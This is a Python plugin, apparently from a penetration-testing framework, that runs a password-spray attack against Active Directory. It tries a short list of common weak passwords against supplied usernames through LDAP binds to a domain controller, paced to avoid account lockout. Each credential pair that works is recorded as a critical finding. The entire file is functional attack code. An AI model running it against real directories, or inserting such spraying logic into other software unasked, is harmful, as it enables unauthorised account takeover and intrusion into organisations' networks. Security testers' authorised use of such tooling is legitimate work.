"""Password spraying plugin for Active Directory."""

import asyncio
import logging

from nightowl.core.plugin_base import ScannerPlugin
from nightowl.models.finding import Finding, Severity
from nightowl.models.target import Target

logger = logging.getLogger("nightowl")

try:
    from ldap3 import Connection, Server, SIMPLE
    HAS_LDAP3 = True
except ImportError:
    HAS_LDAP3 = False

DEFAULT_PASSWORDS = ["Password1", "Welcome1", "Company123", "Summer2024", "Winter2024", "P@ssw0rd", "Admin123", "Changeme1"]


class PasswordSprayPlugin(ScannerPlugin):
    name = "password-spray"
    description = "Password spray against AD accounts with rate limiting"
    version = "1.0.0"
    stage = "scan"

    async def run(self, target: Target, **kwargs) -> list[Finding]:
        findings = []
        host = target.ip or target.host
        creds = target.credentials or {}
        domain = creds.get("domain", "")
        users = kwargs.get("users", []) or creds.get("users", [])
        delay = self.config.get("spray_delay", 3.0)
        passwords = self.config.get("passwords", DEFAULT_PASSWORDS[:3])

        if not HAS_LDAP3:
            logger.warning("ldap3 not installed, skipping password spray")
            return findings

        if not domain or not users:
            logger.info("No domain or users provided for password spray")
            return findings

        server = Server(host, port=389, connect_timeout=10)

        for password in passwords:
            for username in users:
                bind_dn = f"{domain}\\{username}"
                try:
                    conn = Connection(server, user=bind_dn, password=password, authentication=SIMPLE, auto_bind=True)
                    findings.append(Finding(
                        title=f"Valid credentials: {username}:{password}",
                        severity=Severity.CRITICAL, cvss_score=9.8,
                        description=f"Password spray found valid credentials for {username}",
                        evidence=f"Domain: {domain}\nUser: {username}\nPassword: {password}\nDC: {host}",
                        remediation="Enforce strong password policies. Implement account lockout. Use MFA.",
                        category="password-spray",
                    ))
                    conn.unbind()
                except Exception:
                    pass

                await asyncio.sleep(delay)

        return findings
